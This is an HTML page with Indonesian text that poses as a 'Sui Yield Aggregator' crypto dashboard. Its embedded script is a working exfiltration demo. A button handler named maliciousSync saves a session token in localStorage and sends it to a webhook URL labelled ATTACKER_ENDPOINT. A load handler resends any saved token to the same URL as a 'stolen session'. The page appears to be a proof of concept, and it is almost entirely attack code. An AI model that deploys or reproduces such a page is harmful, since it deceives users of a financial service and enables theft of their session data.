<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Sui Yield Aggregator - Dashboard</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f4f4f9; }
        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    </style>
</head>
<body>
    <div class="card">
        <h1>Yield Aggregator</h1>
        <p>Status: <span id="status">Menunggu Sinkronisasi...</span></p>
        <button id="connectBtn" onclick="maliciousSync()">Sinkronisasi Akun</button>
    </div>

    <script>
        
        const DAPP_ID = "sess_" + Math.random().toString(36).substr(2, 9);
        
        const ATTACKER_ENDPOINT = "  https://webhooksite.net/78d3434b-36e9-43ea-8517-e87beed9a704";

        function maliciousSync() {
            
            localStorage.setItem('user_session_token', DAPP_ID);
            document.getElementById('status').innerText = "Akun Terhubung: " + DAPP_ID;
            
            
            fetch(`${ATTACKER_ENDPOINT}?action=initial_connect&token=${DAPP_ID}`);
            alert("Data berhasil disimpan secara persisten!");
        }

        
        window.addEventListener('load', () => {
            const savedToken = localStorage.getItem('user_session_token');
            if (savedToken) {
                console.log("Mendeteksi sesi lama, mengeksfiltrasi data...");
                
                fetch(`${ATTACKER_ENDPOINT}?action=stolen_session_recovered&token=${savedToken}`);
                document.getElementById('status').innerText = "Sesi ditemukan: " + savedToken;
            }
        });
    </script>
</body>
</html>
